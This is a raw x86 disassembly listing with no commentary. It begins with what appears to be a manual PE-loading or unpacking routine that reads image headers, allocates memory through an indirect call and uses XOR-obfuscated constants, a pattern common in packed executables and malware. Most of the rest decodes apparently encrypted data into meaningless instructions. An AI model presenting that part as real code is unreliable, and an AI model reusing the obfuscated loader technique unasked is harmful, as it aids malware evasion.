  419d4d:	mov    eax,DWORD PTR [esp+0xc]
  419d51:	mov    eax,DWORD PTR [eax+0x194]
  419d57:	mov    ecx,DWORD PTR [eax]
  419d59:	mov    eax,DWORD PTR [esp+0xc]
  419d5d:	mov    eax,DWORD PTR [eax+0x194]
  419d63:	mov    eax,DWORD PTR [eax]
  419d65:	add    eax,DWORD PTR [ecx+0x3c]
  419d68:	mov    ecx,DWORD PTR [esp+0xc]
  419d6c:	mov    ecx,DWORD PTR [ecx+0x1d8]
  419d72:	mov    ecx,DWORD PTR [ecx+0x14]
  419d75:	push   0x4
  419d77:	push   0x3000
  419d7c:	push   DWORD PTR [eax+0x50]
  419d7f:	push   0x0
  419d81:	call   ecx
  419d83:	mov    DWORD PTR [ebx],eax
  419d85:	mov    eax,DWORD PTR [esp+0x10]
  419d89:	push   DWORD PTR [esp+0xc]
  419d8d:	xor    eax,edi
  419d8f:	add    eax,esi
  419d91:	mov    DWORD PTR [esp+0x20],eax
  419d95:	lea    eax,[esp+0x20]
  419d99:	push   eax
  419d9a:	push   ebx
  419d9b:	push   DWORD PTR [esp+0x20]
  419d9f:	push   DWORD PTR [esp+0x28]
  419da3:	push   DWORD PTR [esp+0x24]
  419da7:	call   0x41976c
  419dac:	mov    eax,DWORD PTR [esp+0x10]
  419db0:	mov    ecx,DWORD PTR [ebx]
  419db2:	xor    eax,edi
  419db4:	add    eax,esi
  419db6:	cmp    ecx,eax
  419db8:	je     0x419e16
  419dba:	mov    eax,DWORD PTR [esp+0x18]
  419dbe:	mov    ecx,DWORD PTR [esp+0x14]
  419dc2:	xor    eax,edi
  419dc4:	add    eax,esi
  419dc6:	imul   eax,DWORD PTR [esp+0x1c]
  419dcb:	mov    DWORD PTR [ecx],eax
  419dcd:	jmp    0x419e16
  419dcf:	mov    ecx,DWORD PTR [ebp+0x20]
  419dd2:	cmp    ecx,0xf89c85b9
  419dd8:	jne    0x419de1
  419dda:	push   0xf89c85b8
  419ddf:	jmp    0x419dff
  419de1:	mov    ecx,DWORD PTR [ebp+0x20]
  419de4:	cmp    ecx,0xf89c85b8
  419dea:	jne    0x419df3
  419dec:	push   0xf89c85bf
  419df1:	jmp    0x419dff
  419df3:	mov    ecx,DWORD PTR [ebp+0x20]
  419df6:	cmp    ecx,0xf89c85bf
  419dfc:	jne    0x419e16
  419dfe:	push   eax
  419dff:	push   DWORD PTR [ebp+0x1c]
  419e02:	push   DWORD PTR [ebp+0x18]
  419e05:	push   ebx
  419e06:	push   DWORD PTR [ebp+0x10]
  419e09:	push   DWORD PTR [ebp+0xc]
  419e0c:	push   DWORD PTR [ebp+0x8]
  419e0f:	call   0x419caa
  419e14:	mov    DWORD PTR [ebx],eax
  419e16:	mov    eax,DWORD PTR [ebx]
  419e18:	pop    edi
  419e19:	pop    esi
  419e1a:	pop    ebx
  419e1b:	mov    esp,ebp
  419e1d:	pop    ebp
  419e1e:	ret    0x1c
  419e21:	push   ebp
  419e22:	mov    ebp,esp
  419e24:	sub    esp,0xc
  419e27:	mov    eax,0xf89c8585
  419e2c:	mov    DWORD PTR [ebp-0x8],eax
  419e2f:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  419e36:	mov    ecx,DWORD PTR [ebp-0x8]
  419e39:	xor    ecx,0x751089b
  419e3f:	add    ecx,0x3272e2
  419e45:	mov    DWORD PTR [ebp-0x4],ecx
  419e48:	mov    ecx,DWORD PTR [ebp+0xc]
  419e4b:	push   eax
  419e4c:	mov    DWORD PTR [ebp+0xc],ecx
  419e4f:	push   DWORD PTR [ebp+0xc]
  419e52:	lea    eax,[ebp-0x4]
  419e55:	push   DWORD PTR [ebp+0x8]
  419e58:	push   eax
  419e59:	push   DWORD PTR [ebp+0xc]
  419e5c:	push   DWORD PTR [ebp-0xc]
  419e5f:	push   DWORD PTR [ebp-0x8]
  419e62:	call   0x419caa
  419e67:	mov    DWORD PTR [ebp-0x4],eax
  419e6a:	mov    eax,DWORD PTR [ebp-0x4]
  419e6d:	leave  
  419e6e:	ret    0x8
  419e71:	dec    esp
  419e72:	inc    ecx
  419e73:	mov    ebp,0xeffebd16
  419e78:	pop    ebx
  419e79:	xchg   ebx,eax
  419e7a:	and    DWORD PTR [ebx-0x47],0x85519188
  419e81:	gs sbb al,0x1
  419e84:	add    BYTE PTR [ebx-0xffffffd],ch
  419e8a:	fbstp  TBYTE PTR [edi+ecx*2-0x54]
  419e8e:	out    dx,al
  419e8f:	ja     0x419ec9
  419e91:	mov    ebx,0x324c4283
  419e96:	push   esp
  419e97:	in     eax,0x4b
  419e99:	add    dl,BYTE PTR [ebp-0x14f783f]
  419e9f:	sbb    BYTE PTR [edi-0x38],dl
  419ea2:	adc    BYTE PTR [edi],bl
  419ea4:	lods   eax,DWORD PTR ds:[esi]
  419ea5:	gs std 
  419ea7:	pusha  
  419ea8:	pop    esi
  419ea9:	nop
  419eaa:	xchg   esi,eax
  419eab:	xor    al,0xd8
  419ead:	sub    al,BYTE PTR [edx+0x5d]
  419eb0:	jge    0x419e6d
  419eb2:	leave  
  419eb3:	xor    al,0x1f
  419eb5:	sbb    BYTE PTR [eax+0x74e5fa10],bl
  419ebb:	(bad)  
  419ebd:	fnstcw WORD PTR [edx-0x1e]
  419ec0:	clc    
  419ec1:	pop    ds
  419ec2:	clc    
  419ec3:	fstp   DWORD PTR [eax]
  419ec5:	pop    esi
  419ec6:	(bad)  
  419ec7:	and    edx,esp
  419ec9:	(bad)  
  419ecb:	lds    edx,FWORD PTR [edx]
  419ecd:	xlat   BYTE PTR ds:[ebx]
  419ece:	std    
  419ecf:	dec    esp
  419ed0:	dec    edi
  419ed1:	xchg   esi,eax
  419ed2:	out    dx,eax
  419ed3:	jle    0x419f3e
  419ed5:	adc    ch,BYTE PTR [esi+ecx*2+0x2f73f7ee]
  419edc:	inc    edx
  419edd:	or     BYTE PTR [ebx-0x6a],ch
  419ee0:	imul   ecx,DWORD PTR [eax-0xe04fe16],0xfffffff1
  419ee7:	test   dh,ah
  419ee9:	add    DWORD PTR [esi+0x55],ebx
  419eec:	fisub  WORD PTR [eax+0x61657bc7]
  419ef2:	lock pop si
  419ef5:	jnp    0x419e86
  419ef7:	pop    ds
  419ef8:	fsub   DWORD PTR [eax]
  419efa:	lock daa 
  419efc:	or     bh,BYTE PTR [eax-0x34f3f9c7]
  419f02:	out    0x29,eax
  419f04:	adc    dl,BYTE PTR [edi]
  419f06:	and    BYTE PTR [ecx-0x3c],dl
  419f09:	aas    
  419f0a:	dec    eax
  419f0b:	push   esi
  419f0c:	adc    ebp,esi
  419f0e:	ins    DWORD PTR es:[edi],dx
  419f0f:	mov    dl,0xc3
  419f11:	popf   
  419f12:	aad    0xb0
  419f14:	test   eax,0x30473087
  419f19:	repnz dec ecx
  419f1b:	es stos BYTE PTR es:[edi],al
  419f1d:	jmp    FWORD PTR [ebx-0x4e]
  419f20:	in     eax,0x17
  419f22:	mov    edx,0x5d31ab07
  419f27:	fmulp  st(1),st
  419f29:	push   ss
  419f2a:	shr    dh,0x54
  419f2d:	int3   
  419f2e:	or     BYTE PTR [edi+ebp*1+0x4c],0xda
  419f33:	retf   
  419f34:	enter  0x98fb,0xc1
  419f38:	push   0x1a
  419f3a:	sti    
  419f3b:	shl    esp,cl
  419f3d:	shl    BYTE PTR [ecx-0x26517c0a],cl
  419f43:	push   ebx
  419f44:	sete   bl
  419f47:	int    0x2c
  419f49:	out    dx,eax
  419f4a:	push   eax
  419f4b:	shr    DWORD PTR [ebx-0x873099],cl
  419f51:	adc    dl,dl
  419f53:	mov    al,ds:0xf6a11100
  419f58:	mov    ds:0x379397d9,al
  419f5d:	xor    esp,DWORD PTR [eax-0x40]
  419f60:	sti    
  419f61:	out    0xbb,al
  419f63:	das    
  419f64:	test   DWORD PTR [ebx],ecx
  419f66:	iret   
  419f67:	and    al,0x1a
  419f69:	add    ebp,esi
  419f6b:	out    0x23,al
  419f6d:	out    0xa,eax
  419f6f:	lods   eax,DWORD PTR ds:[esi]
  419f70:	pop    ebx
  419f71:	xor    eax,0x50652aad
  419f76:	inc    edi
  419f77:	ror    DWORD PTR [ebp+0x7eaddf6f],1
  419f7d:	ret    0xed30
  419f80:	push   edx
  419f81:	jo     0x419f3b
  419f83:	stos   BYTE PTR es:[edi],al
  419f84:	dec    edx
  419f85:	addr16 xchg esi,eax
  419f87:	mov    edx,0xace4b702
  419f8c:	adc    eax,0xf5766ac0
  419f91:	hlt    
  419f92:	(bad)  [ecx]
  419f94:	call   0xe29a21d5
  419f99:	jne    0x419fab
  419f9b:	xchg   DWORD PTR [edi],edi
  419f9d:	lods   al,BYTE PTR ds:[esi]
  419f9e:	mov    cl,0x1f
  419fa0:	stos   DWORD PTR es:[edi],eax
  419fa1:	sbb    dh,ch
  419fa3:	out    0xb3,eax
  419fa5:	sub    BYTE PTR [edi-0x5a],ch
  419fa8:	jbe    0x419f3d
  419faa:	mov    esi,0xfb751b09
  419faf:	jno    0x419fcc
  419fb1:	fmul   DWORD PTR [ebp+ecx*1-0x4750afad]
  419fb8:	inc    eax
  419fb9:	sbb    eax,0xa3049f57
  419fbe:	jo     0x419fc0
  419fc0:	pop    ds
  419fc1:	loopne 0x419fb3
  419fc3:	push   ebp
  419fc4:	scas   al,BYTE PTR es:[edi]
  419fc5:	mov    ecx,0xb6b99cd6
  419fca:	cmp    eax,esp
  419fcc:	push   ebx
  419fcd:	xchg   esp,eax
  419fce:	loopne 0x41a028
  419fd0:	stos   DWORD PTR es:[edi],eax
  419fd1:	loope  0x419fd3
  419fd3:	and    al,0x5d
  419fd5:	les    eax,FWORD PTR [esp+eiz*8+0x39]
  419fd9:	enter  0xf8a,0xe
  419fdd:	mov    WORD PTR [eax],?
  419fdf:	ffree  st(0)
  419fe1:	jo     0x419fbd
  419fe3:	xor    al,0x73
  419fe5:	sbb    esi,DWORD PTR gs:[esi-0x4ce4e23f]
  419fec:	bound  edi,QWORD PTR [esi-0x2ea02541]
  419ff2:	imul   edx,DWORD PTR [ebx+0x1d883373],0xffffffda
  419ff9:	fiadd  DWORD PTR [esp+eiz*4-0x6bf43cfd]
  41a000:	sahf   
  41a001:	fldcw  WORD PTR [esi-0x1a54bc18]
  41a007:	mov    dh,0x4f
  41a009:	retf   0xe6d
  41a00c:	shr    BYTE PTR [edx-0x1fb347],1
  41a012:	ds into 
  41a014:	pop    es
  41a015:	fs (bad) 
  41a017:	pop    ds
  41a018:	cs sub esp,edx
  41a01b:	xchg   ecx,eax
  41a01c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a01d:	cli    
  41a01e:	jmp    0x41a095
  41a020:	sbb    dh,BYTE PTR [ecx-0x1c3df615]
  41a026:	(bad)  
  41a027:	and    al,0xb2
  41a029:	gs aam 0x52
  41a02c:	or     ecx,DWORD PTR [eax+0x3dc1fc43]
  41a032:	adc    eax,0x82d62967
  41a037:	inc    ecx
  41a038:	in     eax,dx
  41a039:	retf   
  41a03a:	mov    eax,ds:0xb187c5ba
  41a03f:	xchg   esi,eax
  41a040:	scas   al,BYTE PTR es:[edi]
  41a041:	ins    BYTE PTR es:[edi],dx
  41a042:	in     eax,0xb
  41a044:	and    al,0xd0
  41a046:	stc    
  41a047:	jmp    0x7f776a1f
  41a04c:	jbe    0x419ff3
  41a04e:	clc    
  41a04f:	aaa    
  41a050:	icebp  
  41a051:	aaa    
  41a052:	in     al,dx
  41a053:	in     eax,dx
  41a054:	mov    dh,0x95
  41a056:	mov    edi,?
  41a058:	fs in  eax,dx
  41a05a:	mov    edi,0xf4baec47
  41a05f:	clc    
  41a060:	inc    ebx
  41a061:	jb     0x41a084
  41a063:	jns    0x419fed
  41a065:	mov    edx,0x51ebeffa
  41a06a:	push   ebx
  41a06b:	push   ecx
  41a06c:	(bad)  
  41a06d:	int3   
  41a06e:	add    al,0xcb
  41a070:	add    ch,BYTE PTR [edx]
  41a072:	or     edx,DWORD PTR [edx]
  41a074:	mov    edi,0xe11716e1
  41a079:	in     eax,0xd7
  41a07b:	pop    ss
  41a07c:	mov    es,WORD PTR [edx+ebp*8-0x6c30578]
  41a083:	inc    ecx
  41a084:	sbb    esi,esp
  41a086:	or     al,0x87
  41a088:	popf   
  41a089:	mov    ds:0xde1b76e0,eax
  41a08e:	iret   
  41a08f:	pop    esp
  41a090:	shl    BYTE PTR [edx*2-0x42807ca],1
  41a097:	mov    ebp,?
  41a099:	in     al,dx
  41a09a:	and    ah,BYTE PTR [esp+ebx*8+0x57317bc5]
  41a0a1:	sub    dl,ch
  41a0a3:	leave  
  41a0a4:	add    esi,DWORD PTR [ebp-0x4484b099]
  41a0aa:	adc    DWORD PTR [esi+0xa],ecx
  41a0ad:	outs   dx,DWORD PTR ds:[esi]
  41a0ae:	xchg   esp,eax
  41a0af:	nop
  41a0b0:	cdq    
  41a0b1:	mov    cl,0xbc
  41a0b3:	cwde   
  41a0b4:	(bad)  [ebx+0x7]
  41a0b7:	into   
  41a0b8:	jmp    0x41a0cf
  41a0ba:	test   al,0xe7
  41a0bc:	xor    esp,esp
  41a0be:	ins    DWORD PTR es:[edi],dx
  41a0bf:	xor    edx,esi
  41a0c1:	add    BYTE PTR [eax],ch
  41a0c3:	(bad)  
  41a0c4:	fmul   DWORD PTR [ecx+ebp*1-0x1d]
  41a0c8:	pop    edx
  41a0c9:	loopne 0x41a085
  41a0cb:	xor    eax,0xd4f7373a
  41a0d0:	dec    edi
  41a0d1:	dec    ebp
  41a0d2:	inc    ebp
  41a0d3:	push   0x5bca2726
  41a0d8:	sbb    DWORD PTR [edi+0x15],ebp
  41a0db:	in     al,dx
  41a0dc:	sub    ebp,DWORD PTR [ebx]
  41a0de:	aam    0xb2
  41a0e0:	ss mov bl,0xec
  41a0e3:	inc    ecx
  41a0e4:	mov    BYTE PTR [edi-0x1114984e],bh
  41a0ea:	pop    ebx
  41a0eb:	xor    al,0xb3
  41a0ed:	jl     0x41a14a
  41a0ef:	fnsave [edx-0x4e918dd8]
  41a0f5:	call   0x871c:0x6bfb4bdf
  41a0fc:	inc    edi
  41a0fd:	leave  
  41a0fe:	lods   eax,DWORD PTR ds:[esi]
  41a0ff:	repz xchg ebx,eax
  41a101:	xor    eax,0xbe254598
  41a106:	dec    edx
  41a107:	xor    eax,0x1d4bd471
  41a10c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a10d:	mov    dh,0x71
  41a10f:	inc    ebp
  41a110:	cmp    BYTE PTR [ecx+esi*1-0x21],bh
  41a114:	and    dl,0x28
  41a117:	aas    
  41a118:	or     dh,al
  41a11a:	jg     0x41a0cc
  41a11c:	xor    edi,DWORD PTR [esi]
  41a11e:	or     DWORD PTR [edx-0x75],ecx
  41a121:	aaa    
  41a122:	test   eax,0x8a8c46b9
  41a127:	sub    eax,0xf950c1ff
  41a12c:	loop   0x41a168
  41a12e:	push   ecx
  41a12f:	mov    WORD PTR [ecx-0x2d200b57],es
  41a135:	addr16 nop
  41a137:	dec    ebp
  41a138:	or     cl,BYTE PTR [esp+ecx*1]
  41a13b:	in     eax,dx
  41a13c:	sub    ebx,DWORD PTR [edx]
  41a13e:	out    dx,al
  41a13f:	adc    BYTE PTR [eax-0x600a4886],ah
  41a145:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a146:	and    eax,0x2893e744
  41a14b:	aaa    
  41a14c:	mov    cl,0xf0
  41a14e:	ja     0x41a165
  41a150:	gs ret 
  41a152:	fidiv  DWORD PTR [ebp-0x3a]
  41a155:	mov    ds:0x10f48f93,eax
  41a15a:	shr    BYTE PTR [ebx+0x58],cl
  41a15d:	in     eax,0x1b
  41a15f:	dec    ebx
  41a160:	xchg   edx,eax
  41a161:	mov    dh,0xf3
  41a163:	dec    edi
  41a164:	or     dl,bl
  41a166:	mov    BYTE PTR [edx],bh
  41a168:	add    eax,0xca836445
  41a16d:	rcr    eax,0xe2
  41a170:	jmp    0x41a1b6
  41a172:	or     bl,0xb0
  41a175:	hlt    
  41a176:	mov    eax,0xf3e1d2cc
  41a17b:	dec    ebp
  41a17c:	adc    dl,ch
  41a17e:	popf   
  41a17f:	(bad)  
  41a180:	xlat   BYTE PTR ds:[ebx]
  41a181:	out    0xc1,eax
  41a183:	xchg   esp,eax
  41a184:	dec    edi
  41a185:	add    cl,al
  41a187:	in     eax,0x3c
  41a189:	add    al,0xdf
  41a18b:	xchg   ebx,eax
  41a18c:	jle    0x41a1bf
  41a18e:	lock and ecx,DWORD PTR [esi]
  41a191:	or     ch,BYTE PTR [ebp+eax*2+0x217e2053]
  41a198:	jbe    0x41a1f6
  41a19a:	jae    0x41a196
  41a19c:	xor    edi,DWORD PTR [edi+ecx*8]
  41a19f:	aam    0x88
  41a1a1:	push   esi
  41a1a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a1a3:	sub    BYTE PTR [ebx],0x9
  41a1a6:	outs   dx,DWORD PTR ds:[esi]
  41a1a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a1a8:	outs   dx,DWORD PTR ds:[esi]
  41a1a9:	add    dl,BYTE PTR [ebx+0x25f2c7eb]
  41a1af:	sub    al,0x39
  41a1b1:	lods   al,BYTE PTR ds:[esi]
  41a1b2:	and    eax,0x52e6530d
  41a1b7:	lods   al,BYTE PTR ds:[esi]
  41a1b8:	jmp    0x3a9d:0x2c3bf639
  41a1bf:	xchg   edx,eax
  41a1c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a1c1:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41a1c3:	xchg   edx,eax
  41a1c4:	daa    
  41a1c5:	imul   ebx,DWORD PTR [eax],0xe
  41a1c8:	arpl   WORD PTR [ecx-0x52d5cae7],cx
  41a1ce:	inc    edx
  41a1cf:	inc    edx
  41a1d0:	neg    BYTE PTR [eax]
  41a1d2:	pop    esi
  41a1d3:	hlt    
  41a1d4:	dec    edi
  41a1d5:	cli    
  41a1d6:	dec    cl
  41a1d8:	ret    
  41a1d9:	arpl   WORD PTR ds:0x13e35c94,cx
  41a1df:	xor    eax,0x772ea2f1
  41a1e4:	dec    ecx
  41a1e5:	xchg   DWORD PTR [esi-0x63299208],edx
  41a1eb:	adc    eax,0xa96be9
  41a1f0:	(bad)  [ecx-0x2e]
  41a1f3:	xchg   DWORD PTR [ecx-0x28086b47],esp
  41a1f9:	and    esi,DWORD PTR [esi]
  41a1fb:	xchg   BYTE PTR [edi],bh
  41a1fd:	addr16 clc 
  41a1ff:	xor    al,BYTE PTR [ebx+esi*8+0x51]
  41a203:	cmp    esi,DWORD PTR [ebx+0x64]
  41a206:	add    al,0x8d
  41a208:	test   BYTE PTR [eax-0x3b18b8b9],dh
  41a20e:	fnstsw WORD PTR [ebx+0x54ebbf8d]
  41a214:	cmc    
  41a215:	lds    edi,FWORD PTR [edi-0x4a8947a6]
  41a21b:	gs enter 0xfd47,0x3b
  41a220:	and    BYTE PTR [edx+0x1232fbfa],al
  41a226:	push   DWORD PTR [edx+0x25]
  41a229:	pop    esi
  41a22a:	jle    0x41a20e
  41a22c:	jp     0x41a220
  41a22e:	imul   ebx,DWORD PTR [esi],0x9
  41a231:	fsub   QWORD PTR [ebx+0x58]
	...
  41a240:	add    BYTE PTR [esi-0x105c14ff],ch
  41a246:	jmp    0x41a236
  41a248:	or     eax,0x116c2f8b
  41a24d:	and    DWORD PTR [ecx],esp
  41a24f:	int    0xc1
  41a251:	adc    BYTE PTR [eax],ah
  41a253:	add    DWORD PTR [eax],eax
  41a255:	stos   DWORD PTR es:[edi],eax
  41a256:	add    eax,DWORD PTR [eax]
  41a258:	add    BYTE PTR [ebx-0x38a57fde],bh
  41a25e:	rol    DWORD PTR [ebx-0x7a],cl
  41a261:	enter  0x6db0,0x58
  41a265:	adc    al,0xc5
  41a267:	aam    0x43
  41a269:	mov    DWORD PTR [edi],esp
  41a26b:	and    cl,cl
  41a26d:	repz in eax,dx
  41a26f:	add    edi,DWORD PTR [ebx-0x4419799f]
  41a275:	das    
  41a276:	mov    DWORD PTR [edi+0x7c],esp
  41a279:	shr    BYTE PTR [esp+eax*1-0x9d5e45e],0xe7
  41a281:	loop   0x41a20d
  41a283:	sbb    BYTE PTR [eax],bl
  41a285:	pop    esp
  41a286:	lds    ebp,FWORD PTR [edi]
  41a288:	or     al,bh
  41a28a:	fxch   st(5)
  41a28c:	adc    eax,0x363a4eae
  41a291:	or     eax,0x8f339b11
  41a296:	lock add DWORD PTR [eax+0x57],eax
  41a29a:	sbb    eax,0x3d69ff5b
  41a29f:	and    BYTE PTR [esi],ch
  41a2a1:	imul   esi,DWORD PTR [edx-0x17260e5e],0x15
  41a2a8:	mov    esp,0xb3327858
  41a2ad:	push   edx
  41a2ae:	jno    0x41a267
  41a2b0:	mov    edi,0xa63f8dc3
  41a2b5:	xchg   ebx,eax
  41a2b6:	adc    dl,ch
  41a2b8:	sub    al,0xa1
  41a2ba:	mov    ecx,0xd1be0a2c
  41a2bf:	mov    esi,0x1eb7c3fc
  41a2c4:	xchg   ebp,eax
  41a2c5:	aad    0xb4
  41a2c7:	retf   
  41a2c8:	dec    edx
  41a2c9:	fsubr  st,st(6)
  41a2cb:	lds    edi,FWORD PTR [esi+0x2b]
  41a2ce:	add    ah,BYTE PTR [eax]
  41a2d0:	and    BYTE PTR [ebp+eax*2-0x759f7585],ch
  41a2d7:	sbb    DWORD PTR [ecx+0x6bdf07df],0x15
  41a2de:	stos   BYTE PTR es:[edi],al
  41a2df:	loopne 0x41a273
  41a2e1:	mov    cl,0x69
  41a2e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2e4:	mov    dl,0x8b
  41a2e6:	and    BYTE PTR [edx],0x33
  41a2e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a2ea:	adc    eax,0x46f6baf4
  41a2ef:	add    DWORD PTR [ecx+0x58],eax
  41a2f2:	(bad)  
  41a2f3:	shl    DWORD PTR [ebx+eax*1-0x2ac9a376],cl
  41a2fa:	sbb    DWORD PTR [esi],0x450b29e3
  41a300:	pop    esp
  41a301:	jmp    0xfa2f:0x7ce993b0
  41a308:	adc    DWORD PTR es:[edi+ebp*1-0x460e272b],edi
  41a310:	out    dx,eax
  41a311:	leave  
  41a312:	adc    BYTE PTR [eax+ebx*8+0x5d],ah
  41a316:	pop    DWORD PTR [edi]
  41a318:	push   eax
  41a319:	and    ebx,DWORD PTR [edi-0x4002bd75]
  41a31f:	mov    ebp,0x7cfc762d
  41a324:	inc    eax
  41a325:	and    al,0x2
  41a327:	test   al,0x4c
  41a329:	in     eax,0x26
  41a32b:	inc    ebx
  41a32c:	popa   
  41a32d:	jg     0x41a2c8
  41a32f:	mov    bl,0x5
  41a331:	popa   
  41a332:	stos   DWORD PTR es:[edi],eax
  41a333:	pop    ecx
  41a334:	push   edx
  41a335:	loopne 0x41a348
  41a337:	pushf  
  41a338:	jg     0x41a37b
  41a33a:	ret    
  41a33b:	leave  
  41a33c:	xchg   ecx,eax
  41a33d:	adc    al,dh
  41a33f:	mov    ds:0x911986d5,al
  41a344:	xchg   BYTE PTR [ebx],ah
  41a346:	jp     0x41a3b9
  41a348:	mul    DWORD PTR [esi]
  41a34a:	sbb    ch,BYTE PTR [ecx+eax*8]
  41a34d:	clc    
  41a34e:	and    bp,bp
  41a351:	aaa    
  41a352:	mov    ecx,0x916814a5
  41a357:	mov    al,0x77
  41a359:	fisub  WORD PTR [esi-0x7c1e6703]
  41a35f:	inc    ebx
  41a360:	inc    eax
  41a361:	inc    ebp
  41a362:	jo     0x41a3b7
  41a364:	mov    esi,0x52629b55
  41a369:	pop    edi
  41a36a:	cmp    ebp,DWORD PTR [edx-0x1ce491a3]
  41a370:	ficomp WORD PTR [edx-0x31443364]
  41a376:	jae    0x41a355
  41a378:	ja     0x41a33b
  41a37a:	fdiv   DWORD PTR [ebx-0x129bbad6]
  41a380:	rcl    DWORD PTR [ecx],0x48
  41a383:	inc    esp
  41a384:	cmp    edi,DWORD PTR [esi-0x79]
  41a387:	sti    
  41a388:	push   ecx
  41a389:	xor    al,0x59
  41a38b:	stc    
  41a38c:	jno    0x41a40a
  41a38e:	mov    ds:0x8c34db9c,al
  41a393:	icebp  
  41a394:	fs push 0x83ffa636
  41a39a:	stos   DWORD PTR es:[edi],eax
  41a39b:	push   ebx
  41a39c:	rol    DWORD PTR [ebx+0x710e5e2f],0xe9
  41a3a3:	lods   eax,DWORD PTR ds:[esi]
  41a3a4:	cld    
  41a3a5:	mov    ah,0xbd
  41a3a7:	or     eax,0xdceeaf8e
  41a3ac:	dec    edx
  41a3ad:	or     cl,BYTE PTR [ebx+0x21f2166f]
  41a3b3:	jno    0x41a36a
  41a3b5:	inc    esp
  41a3b6:	mov    edi,0x84e7b1bb
  41a3bb:	pop    ecx
  41a3bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3bd:	aad    0xb7
  41a3bf:	pop    es
  41a3c0:	or     eax,0xf714252
  41a3c5:	repz and esi,DWORD PTR [esi+edi*2-0x67]
  41a3ca:	pop    ds
  41a3cb:	int3   
  41a3cc:	jns    0x41a443
  41a3ce:	das    
  41a3cf:	or     ecx,edx
  41a3d1:	ret    0x835c
  41a3d4:	dec    esp
  41a3d5:	int3   
  41a3d6:	imul   edi,DWORD PTR [esi+0x1ae4cb03],0x33
  41a3dd:	ss cli 
  41a3df:	adc    ecx,DWORD PTR [ebx]
  41a3e1:	outs   dx,BYTE PTR ds:[esi]
  41a3e2:	in     eax,0xa6
  41a3e4:	push   ds
  41a3e5:	outs   dx,BYTE PTR ds:[esi]
  41a3e6:	imul   ecx,DWORD PTR [ecx-0x6e],0xd8482fa
  41a3ed:	mov    BYTE PTR [ebx+0x3fb54da4],al
  41a3f3:	in     al,dx
  41a3f4:	pop    edi
  41a3f5:	mov    bl,0x5e
  41a3f7:	cmp    edx,DWORD PTR [ebx]
  41a3f9:	fwait
  41a3fa:	or     BYTE PTR [ebp-0x13],ah
  41a3fd:	jle    0x41a475
  41a3ff:	ja     0x41a427
  41a401:	dec    ecx
  41a402:	(bad)  ds:0xac89edaf
  41a408:	or     BYTE PTR [eax],0x89
  41a40b:	mov    ah,0xf1
  41a40d:	arpl   WORD PTR [edi+0x2e],sp
  41a410:	sbb    ebp,DWORD PTR [edi]
  41a412:	mul    BYTE PTR [edx+0x1ebfb425]
  41a418:	or     edi,DWORD PTR [ecx-0x58]
  41a41b:	jnp    0x41a454
  41a41d:	in     eax,0x22
  41a41f:	lods   al,BYTE PTR ds:[esi]
  41a420:	pop    esi
  41a421:	and    al,0xdd
  41a423:	ret    0x7563
  41a426:	stc    
  41a427:	leave  
  41a428:	pushf  
  41a429:	in     eax,dx
  41a42a:	push   eax
  41a42b:	mov    esp,0x13b379e
  41a430:	dec    esp
  41a431:	sar    DWORD PTR [edx+0x71ef3724],cl
  41a437:	and    esi,edi
  41a439:	add    esi,ebp
  41a43b:	mov    eax,DWORD PTR [ebx]
  41a43d:	adc    ch,BYTE PTR [edx-0x15efc4d0]
  41a443:	call   FWORD PTR [eax+0x6b]
  41a446:	mov    eax,ds:0x22fb98db
  41a44b:	cli    
  41a44c:	ja     0x41a48f
  41a44e:	inc    ecx
  41a44f:	fiadd  DWORD PTR [ecx+0x442e1620]
  41a455:	fs inc esi
  41a457:	in     al,dx
  41a458:	dec    edx
  41a459:	xor    al,0xf3
  41a45b:	sub    ebp,DWORD PTR [edx+0x1301e413]
  41a461:	call   0x957899f5
  41a466:	mov    esp,0x27f62893
  41a46b:	xor    DWORD PTR [edi],ebp
  41a46d:	popf   
  41a46e:	adc    ah,BYTE PTR ds:0x1856d7e7
  41a474:	xor    BYTE PTR [ecx-0x2f],bh
  41a477:	int    0x54
  41a479:	lods   eax,DWORD PTR ds:[esi]
  41a47a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a47b:	jg     0x41a437
  41a47d:	lea    eax,[eax]
  41a47f:	mov    eax,ds:0x3fae01b5
  41a484:	shr    BYTE PTR [eax+0x704af929],1
  41a48a:	cs jbe 0x41a4ba
  41a48d:	ret    
  41a48e:	das    
  41a48f:	ror    DWORD PTR [edi-0x7e18918a],cl
  41a495:	cdq    
  41a496:	adc    dh,BYTE PTR [esi+0xadeee4]
  41a49c:	and    eax,0xc30001a9
  41a4a1:	arpl   WORD PTR [edi+0x4c3f372f],bx
  41a4a7:	add    eax,0xf7bb1b77
  41a4ac:	dec    edx
  41a4ad:	cdq    
  41a4ae:	xor    ecx,DWORD PTR [ebp+0x7870b1df]
  41a4b4:	int    0xf
  41a4b6:	jno    0x41a44f
  41a4b8:	std    
  41a4b9:	aad    0xd2
  41a4bb:	stos   DWORD PTR es:[edi],eax
  41a4bc:	out    0x44,al
  41a4be:	jmp    0x41a504
  41a4c0:	pop    edi
  41a4c1:	pop    edx
  41a4c2:	(bad)  es:[eax]
  41a4c5:	not    BYTE PTR [edx+0x65]
  41a4c8:	aas    
  41a4c9:	jmp    0x496f4132
  41a4ce:	push   ebp
  41a4cf:	sar    DWORD PTR ds:0x9879aaad,1
  41a4d5:	jb     0x41a4a2
  41a4d7:	and    eax,0xa78140a8
  41a4dc:	popa   
  41a4dd:	dec    eax
  41a4de:	std    
  41a4df:	mov    WORD PTR [edi],?
  41a4e1:	push   esi
  41a4e2:	pop    eax
  41a4e3:	xchg   esi,eax
  41a4e4:	(bad)  
  41a4e6:	xchg   BYTE PTR ds:0xe4a96c8d,bl
  41a4ec:	or     ecx,edx
  41a4ee:	fisubr DWORD PTR [ebx-0x1919378e]
  41a4f4:	push   edi
  41a4f5:	test   dl,dl
  41a4f7:	dec    ebx
  41a4f8:	dec    esi
  41a4f9:	mov    WORD PTR [esi-0x2c],es
